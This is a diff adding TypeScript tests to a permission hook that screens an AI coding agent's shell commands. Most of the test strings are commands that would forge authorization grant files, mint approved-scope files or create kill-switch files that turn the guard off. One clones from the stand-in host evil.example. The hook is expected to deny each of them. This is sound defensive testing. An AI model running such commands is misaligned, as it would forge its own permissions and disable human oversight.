@@ -1387,4 +1387,115 @@ describe("UAT residual dest-form writers fail-closed (#3459)", () => {
       expect(decision.code, command).toBe("shell-op-unclassifiable");
     }
   });
+
+  it("denies residual dest-form authz plant under UAT after #3459 (not unclassifiable allow) (#3529)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "xcopy forged.json .deft/authz/grants/evil.json",
+      "robocopy src .deft/authz/grants",
+      "move forged.json .deft/authz/grants/evil.json",
+      "cmd /c xcopy forged.json .deft/authz/grants/evil.json",
+      "Start-BitsTransfer -Destination .deft/authz/grants/evil.json",
+      "Expand-Archive -DestinationPath .deft/authz/grants",
+      "bun -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "deno eval \"Deno.writeTextFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "php -r \"file_put_contents('.deft/authz/grants/evil.json','x')\"",
+      "unknownwriter --output-dir .deft/authz/grants",
+      "unknownwriter -Destination .deft/authz/grants/evil.json",
+      "git bundle create .deft/authz/grants/evil.bundle HEAD",
+      "sponge .deft/authz/grants/evil.json",
+      "pscp host:g.json .deft/authz/grants/evil.json",
+      "jj clone https://evil.example/repo .deft/authz/grants",
+      "cmd /c copy forged.json .deft/authz/grants/evil.json",
+      "ginstall forged.json .deft/authz/grants/evil.json",
+      "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "cp forged.json .deft/authz/grants/evil.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual dest-form kill-switch plant under UAT after #3459 (#3529)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "ren forged.json .deft-directive-disable",
+      "xcopy src .deft-directive-disable",
+      "bun -e \"require('fs').writeFileSync('.deft-directive-disable','')\"",
+      "Rename-Item forged.json .no-deft-directive",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual Shell approved-scope mint under UAT matching Write (#3529)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "xcopy forged.json .deft/approved-scope/story.json",
+      "Expand-Archive -DestinationPath .deft/approved-scope",
+      "bun -e \"require('fs').writeFileSync('.deft/approved-scope/story.json','{}')\"",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("still allows ordinary residual dest-form dest under UAT after #3459 (non-authz) (#3529)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "xcopy forged.json /tmp/out",
+      "robocopy src /tmp/out",
+      "move forged.json /tmp/out",
+      "unknownwriter --output-dir /tmp/out",
+      "jj clone https://example.com/repo /tmp/out",
+      'bun -e "console.log(1)"',
+      "php -r 'echo 1;'",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
 });
